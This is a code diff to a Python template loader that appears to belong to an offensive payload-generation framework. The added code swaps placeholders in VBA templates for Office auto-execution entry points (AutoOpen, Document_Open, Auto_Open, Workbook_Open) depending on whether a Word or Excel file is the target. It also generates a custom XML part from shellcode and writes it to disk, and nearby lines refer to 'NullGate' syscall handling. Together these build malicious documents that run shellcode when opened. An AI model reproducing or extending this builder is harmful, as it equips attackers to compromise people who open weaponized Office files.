@@ -315,6 +315,37 @@ class TemplateLoader:
         if self.syscall_method == "NullGate":
             template_content = self.sysCallss.process_template_NullGate_syscalls(template_content)
 
+
+        # Replace Auto Open functions based on document type
+        auto_open_placeholder = Config().get('PLACEHOLDERS', 'vba_auto_open')
+        file_open_placeholder = Config().get('PLACEHOLDERS', 'vba_file_open')
+        required_custom_part_placeholder = Config().get('PLACEHOLDERS', 'vba_required_custom_part')
+
+        if self.platform == "windows_vba":
+            if hasattr(self, 'doctype') and self.doctype == "xl":
+                # Excel auto-execution functions
+                if auto_open_placeholder in template_content:
+                    template_content = template_content.replace(auto_open_placeholder, "Auto_Open")
+                if file_open_placeholder in template_content:
+                    template_content = template_content.replace(file_open_placeholder, "Workbook_Open")
+            else:
+                # Word auto-execution functions (default)
+                if auto_open_placeholder in template_content:
+                    template_content = template_content.replace(auto_open_placeholder, "AutoOpen")
+                if file_open_placeholder in template_content:
+                    template_content = template_content.replace(file_open_placeholder, "Document_Open")
+            
+            if required_custom_part_placeholder in template_content:
+                # Generate the XML content using the shellcode
+                xml_content, part_name = self.shellcodeControler.generate_customxml()
+                xml_file_path = os.path.splitext(self.outfile)[0] + ".xml"
+                with open(xml_file_path, "w") as xml_file:
+                    xml_file.write(xml_content)
+                
+                print(f"{Fore.GREEN}[+] {Fore.WHITE}Generated custom XML part in {xml_file_path}")
+                template_content = template_content.replace(required_custom_part_placeholder, part_name)
+        
+        
         # Randomize Syscall names
         # To adapt for SW3 and 
         #if (self.platform == "windows_cpp") and self.syscall_method == "GetSyscallStub":
